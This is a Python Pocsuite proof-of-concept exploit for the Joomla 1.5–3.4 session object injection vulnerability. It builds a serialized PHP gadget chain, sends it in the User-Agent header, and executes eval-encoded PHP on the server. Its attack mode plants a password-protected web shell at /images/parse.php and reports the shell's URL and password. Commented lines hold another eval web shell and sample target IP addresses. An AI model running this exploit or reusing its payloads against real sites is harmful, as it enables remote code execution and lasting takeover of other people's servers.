#!/usr/bin/env python
# coding: utf-8


import urllib
import random
import string

from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


REMARK='''attack_payload 生成方法:
<?php
header("Content-Type: text/plain");
class JSimplepieFactory {
}
class JDatabaseDriverMysql {
  
}
class SimplePie {
    var $sanitize;
    var $cache;
    var $cache_name_function;
    var $javascript;
    var $feed_url;
    function __construct()
    {
        $this->feed_url = "phpinfo();JFactory::getConfig();exit;";
        $this->javascript = 9999;
        $this->cache_name_function = "assert";
        $this->sanitize = new JDatabaseDriverMysql();
        $this->cache = true;
    }
}
  
class JDatabaseDriverMysqli {
    protected $a;
    protected $disconnectHandlers;
    protected $connection;
    function __construct()
    {
        $this->a = new JSimplepieFactory();
        $x = new SimplePie();
        $this->connection = 1;
        $this->disconnectHandlers = [
            [$x, "init"],
        ];
    }
}
  
$a = new JDatabaseDriverMysqli();
$result = serialize($a);
$result = str_replace(chr(0).'*'.chr(0), '\x5C0\x5C0\x5C0', $result);
echo '}__t|'.$result.'\xF0\x9D\x8C\x86';
?>
'''

class TestPOC(POCBase):
    vulID = '1111'  # vul ID
    version = '1'
    author = 'alpha1e0'
    vulDate = '2015-12-15'
    createDate = '2015-12-15'
    updateDate = '2015-12-15'
    references = ['http://drops.wooyun.org/papers/11330']
    name = 'Joomla 1.5~3.4 session 对象注入漏洞 POC'
    appPowerLink = 'https://www.joomla.org/'
    appName = 'Joomla'
    appVersion = '1.5~3.4'
    vulType = '代码注入'
    desc = '''
        joomla 1.5~3.4 session 对象注入漏洞，成功利用同时需要PHP < 5.6.13。joomla中session存储在数据库中，其中user-agent，
        x-forward-for未经过滤存储到数据库中，可在其中插入序列化对象，session_start后自动反序列化触发命令执行
    '''

    #samples = ['http://216.119.147.168/', 'http://69.172.67.176/']

    def _attack(self):
        result = {}
        vul_url = self.url

        #php_code = '''print "start-->|";echo __FILE__;'''
        #php_code = '''print "start-->|";echo getcwd();'''
        #php_code = '''$s='<?php @eval($_POST["pass"]);?>';$n=dirname(dirname(dirname(__FILE__)))."/images/parse.php";$f=fopen($n,"w");fwrite($f,$s);'''
        php_code = '''$s='<?php $f=strrev($_GET["f"]);$f($_POST["pass"]);?>';$n=dirname(dirname(dirname(__FILE__)))."/images/parse.php";$f=fopen($n,"w");fwrite($f,$s);'''
        
        attack_payload = self.gen_payload(php_code)
        #print attack_payload

        session = req.Session()
        response = session.get(vul_url, headers={"User-Agent":attack_payload})
        if response.status_code != 200:
            return self.parse_attack(result)

        response = session.get(vul_url)
        #loc = response.content.find("start-->")
        #print response.content[loc:]
        response = session.get(vul_url.rstrip("/") + "/images/parse.php")
        if response.status_code == 200:
            result['ShellInfo'] = {}
            result['ShellInfo']['URL'] = "/images/parse.php?f=tressa"
            result['ShellInfo']['Content'] = 'password: pass'

        return self.parse_attack(result)


    def _verify(self, verify=True):
        result = {}
        vul_url = self.url

        php_code = '''echo "asdfgh123456";'''
        attack_payload = self.gen_payload(php_code)

        session = req.Session()
        response = session.get(vul_url, headers={"User-Agent":attack_payload})
        if response.status_code != 200:
            return self.parse_attack(result)

        response = session.get(vul_url)
        if response.status_code == 200 and 'asdfgh123456' in response.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Payload'] = attack_payload

        return self.parse_attack(result)


    def gen_payload(self, raw_payload):
        template = '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\x5C0\x5C0\x5C0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:%d:"%sJFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\x5C0\x5C0\x5C0connection";b:1;}\xF0\x9D\x8C\x86' 
        
        encoded_payload = ".".join(["chr({0})".format(ord(x)) for x in raw_payload])
        encoded_payload = "eval({0});".format(encoded_payload)

        return template % (27+len(encoded_payload), encoded_payload)


    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Not vulnerable')
        return output


register(TestPOC)